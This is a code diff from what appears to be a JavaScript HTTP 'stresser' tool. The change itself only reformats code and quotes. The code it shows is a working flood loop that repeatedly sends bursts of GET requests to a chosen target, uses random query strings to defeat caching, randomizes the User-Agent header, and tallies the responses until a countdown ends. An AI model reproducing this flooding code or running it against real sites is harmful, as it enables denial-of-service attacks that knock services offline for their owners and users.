@@ -149,24 +149,27 @@ const run = async () => {
   let unsuccessful_responses = 0;
   let remaining_time = duration;
 
-  intervals.set("STRESSING", setInterval(() => {
-    for (let i = 0; i < throttling; i++) {
-      packets_sent++;
+  intervals.set(
+    'STRESSING',
+    setInterval(() => {
+      for (let i = 0; i < throttling; i++) {
+        packets_sent++;
 
-      fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
-        method: 'GET',
-        headers: {
-          'User-Agent': RandomUA.getRandom()
-        }
-      })
-        .then((response) => {
-          if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
-            successful_responses++;
-          } else unsuccessful_responses++;
+        fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
+          method: 'GET',
+          headers: {
+            'User-Agent': RandomUA.getRandom()
+          }
         })
-        .catch(() => unsuccessful_responses++);
-    }
-  }));
+          .then((response) => {
+            if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
+              successful_responses++;
+            } else unsuccessful_responses++;
+          })
+          .catch(() => unsuccessful_responses++);
+      }
+    })
+  );
 
   let previous_packets_sent = 0;
   let previous_successful_responses = 0;
@@ -199,8 +202,8 @@ const run = async () => {
     if (remaining_time === 0) {
       running = false;
 
-      clearInterval(intervals.get("STRESSING"));
-      intervals.delete("STRESSING")
+      clearInterval(intervals.get('STRESSING'));
+      intervals.delete('STRESSING');
     } else remaining_time--;
   }, 1000);
 };
